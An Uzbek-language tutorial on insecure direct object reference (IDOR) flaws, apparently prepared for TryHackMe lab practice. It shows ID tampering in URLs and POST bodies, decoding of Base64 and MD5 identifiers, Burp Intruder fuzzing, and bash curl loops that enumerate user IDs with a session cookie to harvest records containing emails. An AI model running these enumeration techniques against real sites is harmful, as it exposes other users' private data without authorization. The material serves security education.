# 🆔 IDOR (Insecure Direct Object Reference — Xavfsiz Bo'lmagan To'g'ridan-To'g'ri Ob'ekt Murojaat)

> **Maqsad:** URL, parametr yoki cookie dagi identifikatorni o'zgartirib, boshqa foydalanuvchilarning ma'lumotlariga kirish.

---

## 📖 Asosiy Tushunchalar

### IDOR nima?
Server foydalanuvchi ruxsatini tekshirmasdan, to'g'ridan-to'g'ri so'ralgan ob'ektni qaytarishi.

**Oddiy misol:**
```
# Sizning profilingiz:
https://target.com/profile?user_id=1001

# 1001 → 1002 ga o'zgartiring:
https://target.com/profile?user_id=1002

# Agar boshqa foydalanuvchining profili chiqsa → IDOR topildi!
```

### Qayerda bo'lishi mumkin?
- URL parametrlari: `?id=5`, `?user=john`, `?order=123`
- POST so'rov tanasi: `{"account_id": 456}`
- Cookie: `user_id=789`
- Fayl nomlari: `/download?file=invoice_001.pdf`

---

## 🔍 IDOR Topish

### 1. URL Parametrlarini O'zgartirish

```
# Asl so'rov
GET /api/user?id=101

# Urinish
GET /api/user?id=100   → boshqa foydalanuvchi?
GET /api/user?id=1     → admin?
GET /api/user?id=0     → xato yoki admin?
```

### 2. POST So'rovdagi Ma'lumotlarni O'zgartirish
```http
# Asl so'rov (Burp Suite da ko'rish)
POST /api/order/details
Content-Type: application/json

{"order_id": 5678, "user_id": 1001}

# O'zgartirish
{"order_id": 5678, "user_id": 1002}
```

### 3. Kodlangan Qiymatlarni Topish

Ba'zan ID lar yashirish uchun kodlanadi. Ularni topib, decode qilish kerak:

**Base64:**
```bash
# Agar parametr: ?ref=dXNlcjoxMDIx
echo "dXNlcjoxMDIx" | base64 -d
# Natija: user:1021

# O'zgartirish: user:1022
echo "user:1022" | base64
# Natija: dXNlcjoxMDIy → buni parametrga qo'y
```

**Hash (MD5):**
```bash
# 1 → c4ca4238a0b923820dcc509a6f75849b
echo -n "1" | md5sum    # c4ca42...
echo -n "2" | md5sum    # c81e72...
echo -n "3" | md5sum    # eccbc87...
```

---

## 🗂️ IDOR Turlari

### Horizontal IDOR (Gorizontal — bir xil darajadagi foydalanuvchilar orasida)
```
Siz: user_id=1001 → Boshqa foydalanuvchi: user_id=1002
Ikkalasi ham oddiy foydalanuvchi — lekin bir-birining ma'lumotiga kiradi
```

### Vertical IDOR (Vertikal — past darajadan yuqori darajaga)
```
Siz: user_id=1001 (oddiy foydalanuvchi)
Admin: user_id=1 (admin)
1001 → 1 ga o'zgartirib admin ma'lumotlariga kirish
```

---

## 🌐 API va IDOR

Ko'pincha IDOR API endpoint larida bo'ladi:

```bash
# Foydalanuvchi ma'lumotlari
GET /api/v1/users/1001
GET /api/v1/users/1     ← admin?

# Buyurtma ma'lumotlari
GET /api/v1/orders/5678
GET /api/v1/orders/1    ← birinchi buyurtma?

# Fayl yuklab olish
GET /api/v1/download?file=report_1001.pdf
GET /api/v1/download?file=report_1002.pdf  ← boshqa foydalanuvchi?
```

---

## 🔧 Burp Suite bilan IDOR Tekshirish

```
1. Burp Suite oching → Proxy → Intercept ON
2. Brauzerda o'z profilingizni oching
3. So'rov Burp Intruder ga yuboring (CTRL+I)
4. Positions: user_id=§1001§ — § belgilari orasini fuzz qiling
5. Payloads: Numbers → 1 dan 2000 gacha
6. Start Attack
7. Status 200 bo'lganlarni tekshiring
```

---

## 🎯 Amaliy Misol

**Vaziyat:** Saytga kirgansiz, sizning user_id=1337.

```bash
# 1-qadam: O'z profilingizni oching va URL ni kuzating
https://target.com/user?id=1337

# 2-qadam: ID ni o'zgartiring
https://target.com/user?id=1
https://target.com/user?id=2
https://target.com/user?id=1000

# 3-qadam: Agar API bo'lsa
curl -b "session=abc123" https://target.com/api/user/1337
curl -b "session=abc123" https://target.com/api/user/1

# 4-qadam: Buyurtmalar/hisobotlar
curl -b "session=abc123" https://target.com/api/orders/1337
curl -b "session=abc123" https://target.com/api/orders/1

# 5-qadam: Fayl yuklash
curl -b "session=abc123" "https://target.com/download?invoice=1337.pdf"
curl -b "session=abc123" "https://target.com/download?invoice=1.pdf"
```

---

## 🔢 ID Raqamlarini Tez Tekshirish (Bash Loop)

```bash
# 1 dan 100 gacha barcha ID larni tekshirish
for i in {1..100}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "session=YOUR_SESSION" \
    "https://target.com/api/user/$i")
  echo "ID $i: HTTP $response"
done

# Faqat 200 larni ko'rish
for i in {1..100}; do
  response=$(curl -s -b "session=YOUR_SESSION" "https://target.com/api/user/$i")
  if echo "$response" | grep -q "email"; then
    echo "ID $i: $response"
  fi
done
```

---

## 💡 Eslab Qolish Uchun

- **IDOR** = ID → O'zgartir → Boshqa ma'lumot chiqsa → Zaiflik!
- **Horizontal** = Bir xil darajadagi foydalanuvchi ma'lumotlari
- **Vertical** = Yuqori darajadagi (admin) ma'lumotlari
- Base64, MD5 kabi kodlangan ID larni ham tekshir
- API endpoint lari (`/api/v1/`) ko'pincha IDOR zaif bo'ladi
- Burp Intruder → ID larni avtomatik fuzz qilish
- Faqat raqam emas: `?user=john` → `?user=admin` ham tekshir!

### IDOR Topilganda Nima Qilish Kerak?
Har doim **ruxsatsiz** ma'lumotlarni o'qimang/o'zgartirmang. TryHackMe laboratoriyalarida xavfsiz sinab ko'ring.
